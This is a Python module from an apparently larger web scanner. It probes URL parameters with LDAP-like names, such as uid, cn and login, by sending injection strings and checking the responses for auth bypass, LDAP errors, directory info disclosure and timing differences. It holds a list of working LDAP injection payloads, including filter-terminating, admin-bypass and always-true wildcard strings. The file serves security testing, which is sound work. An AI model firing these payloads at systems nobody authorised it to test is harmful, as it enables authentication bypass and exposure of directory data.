"""LDAP injection active probe."""

import time
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import classify_endpoint, endpoint_base_key, endpoint_signature
from src.analysis.passive.runtime import ResponseCache
from src.recon.common import normalize_url

from ._confidence import probe_confidence, probe_severity
from ._patterns import LDAP_ERROR_RE

LDAP_PARAM_NAMES = {
    "uid",
    "cn",
    "mail",
    "user",
    "login",
    "username",
    "samaccountname",
    "sAMAccountName",
    "dn",
    "distinguishedname",
    "givenname",
    "sn",
    "name",
    "search",
    "filter",
    "query",
    "ldap",
    "principal",
    "account",
    "email",
    "logon",
    "userid",
    "user_id",
}

LDAP_PAYLOADS: list[tuple[str, str]] = [
    ("wildcard_escape", "*"),
    ("paren_close", ")"),
    ("filter_terminate", "*)(uid=*))(|(uid=*"),
    ("admin_bypass", "admin)(&"),
    ("objectclass_all", "*)(objectClass=*"),
    ("or_injection", "(|(objectClass=*)"),
    ("null_byte", "%00"),
    ("backslash_escape", "\\"),
    ("asterisk_paren", "*)(&"),
    ("filter_close_open", ")(cn=*))(|(cn=*"),
    ("always_true", "*)(|(objectClass=*"),
    ("uid_wildcard", "*)(uid=*"),
    ("password_bypass", "*)(|(password=*)"),
    ("and_injection", "(&(uid=*))"),
    ("or_uid", "(|(uid=*)(cn=*))"),
]


def _build_test_url(
    base_url: str,
    param_index: int,
    param_name: str,
    payload_value: str,
    original_pairs: list[tuple[str, str]],
) -> str:
    parsed = urlparse(base_url)
    updated = list(original_pairs)
    updated[param_index] = (param_name, payload_value)
    return str(normalize_url(urlunparse(parsed._replace(query=urlencode(updated, doseq=True)))))


def _detect_ldap_issues(
    body: str,
    status: int,
    baseline_status: int,
    baseline_len: int,
    response_len: int,
) -> list[str]:
    issues: list[str] = []

    if baseline_status in (401, 403) and status == 200:
        issues.append("ldap_auth_bypass")
    elif LDAP_ERROR_RE.search(body):
        issues.append("ldap_error_pattern")
    elif "LDAP" in body and ("error" in body.lower() or "exception" in body.lower()):
        issues.append("ldap_error_pattern")
    elif "Invalid DN syntax" in body or "invalid DN" in body.lower():
        issues.append("ldap_error_pattern")
    elif "Operations error" in body or "operationsError" in body:
        issues.append("ldap_error_pattern")
    elif "unwilling to perform" in body.lower():
        issues.append("ldap_error_pattern")
    elif status != baseline_status and status < 500 and baseline_status not in (0, 404):
        issues.append("ldap_response_divergence")
    elif baseline_len > 0 and abs(response_len - baseline_len) > baseline_len * 0.5:
        issues.append("ldap_response_divergence")

    if "serverSaslCreds" in body or "supportedSASLMechanisms" in body:
        issues.append("ldap_info_disclosure")
    elif "defaultNamingContext" in body or "rootDomainNamingContext" in body:
        issues.append("ldap_info_disclosure")
    elif "dnsHostName" in body or "ldapServiceName" in body:
        issues.append("ldap_info_disclosure")

    return issues


def ldap_injection_active_probe(
    priority_urls: list[str],
    response_cache: ResponseCache,
    limit: int = 15,
) -> list[dict[str, Any]]:
    """Test LDAP-relevant parameters with injection payloads.

    Sends payloads like *)(uid=*))(|(uid=*, admin)(&, *)(objectClass=*
    to parameters that look like they interact with LDAP directories.
    Checks responses for LDAP error patterns, authentication bypass,
    information disclosure, and blind injection via timing differences.

    Args:
        priority_urls: List of URL strings to test.
        response_cache: Response cache for making requests.
        limit: Maximum number of findings to return.

    Returns:
        List of LDAP injection findings.
    """
    findings: list[dict[str, Any]] = []
    seen: set[str] = set()

    for url_entry in priority_urls:
        if len(findings) >= limit:
            break
        url = str(url_entry.get("url", "") if isinstance(url_entry, dict) else url_entry).strip()
        if not url:
            continue

        parsed = urlparse(url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)
        if not query_pairs:
            continue

        ldap_params = [
            (i, k, v) for i, (k, v) in enumerate(query_pairs) if k.lower() in LDAP_PARAM_NAMES
        ]
        if not ldap_params:
            continue

        endpoint_key = endpoint_signature(url)
        if endpoint_key in seen:
            continue
        seen.add(endpoint_key)

        if classify_endpoint(url) == "STATIC":
            continue

        baseline = response_cache.get(url)
        baseline_status = int(baseline.get("status_code") or 0) if baseline else 0
        baseline_len = len(str(baseline.get("body_text") or "")) if baseline else 0
        baseline_latency = baseline.get("latency_seconds", 0.0) if baseline else 0.0

        url_issues: list[str] = []
        url_probes: list[dict[str, Any]] = []

        for idx, param_name, _param_value in ldap_params:
            if len(url_probes) >= 3:
                break

            for payload_name, payload_value in LDAP_PAYLOADS:
                if len(url_probes) >= 3:
                    break

                test_url = _build_test_url(url, idx, param_name, payload_value, query_pairs)

                probe_start = time.monotonic()
                response = response_cache.request(
                    test_url,
                    headers={"Cache-Control": "no-cache", "X-LDAP-Probe": "1"},
                )
                probe_latency = time.monotonic() - probe_start

                if not response:
                    continue

                body = str(response.get("body_text", "") or "")[:8000]
                status = int(response.get("status_code") or 0)
                response_len = len(body)

                issues_for_hit = _detect_ldap_issues(
                    body,
                    status,
                    baseline_status,
                    baseline_len,
                    response_len,
                )

                if (
                    baseline_latency > 0
                    and probe_latency > baseline_latency * 3
                    and probe_latency > 2.0
                ):
                    issues_for_hit.append("ldap_blind_time_based")

                if issues_for_hit:
                    url_issues.extend(issues_for_hit)
                    url_probes.append(
                        {
                            "parameter": param_name,
                            "payload": payload_value,
                            "payload_type": payload_name,
                            "baseline_status": baseline_status,
                            "response_status": status,
                            "baseline_length": baseline_len,
                            "response_length": response_len,
                            "probe_latency": round(probe_latency, 3),
                            "issues": issues_for_hit,
                        }
                    )
                    break

        if url_probes:
            severity = probe_severity(url_issues)
            confidence = probe_confidence(url_issues)
            issue_titles = {
                "ldap_auth_bypass": "LDAP Authentication Bypass via Injection",
                "ldap_error_pattern": "LDAP Error Message Disclosure",
                "ldap_info_disclosure": "LDAP Server Information Disclosure",
                "ldap_response_divergence": "LDAP Injection Response Divergence",
                "ldap_blind_time_based": "Blind LDAP Injection via Timing",
            }
            primary_issue = next(
                (issue for issue in url_issues if issue in issue_titles),
                url_issues[0] if url_issues else "ldap_response_divergence",
            )
            title = issue_titles.get(primary_issue, "LDAP Injection Suspected")
            evidence_parts = []
            for probe in url_probes:
                evidence_parts.append(
                    f"param={probe['parameter']}, "
                    f"payload={probe['payload']}, "
                    f"status={probe['response_status']}, "
                    f"issues={','.join(probe['issues'])}"
                )
            evidence = "; ".join(evidence_parts)
            findings.append(
                {
                    "url": url,
                    "endpoint_key": endpoint_key,
                    "endpoint_base_key": endpoint_base_key(url),
                    "endpoint_type": classify_endpoint(url),
                    "issues": url_issues,
                    "probes": url_probes,
                    "confidence": confidence,
                    "severity": severity,
                    "category": "injection",
                    "title": title,
                    "evidence": evidence,
                }
            )

    findings.sort(key=lambda item: (-item["confidence"], item["url"]))
    return findings[:limit]
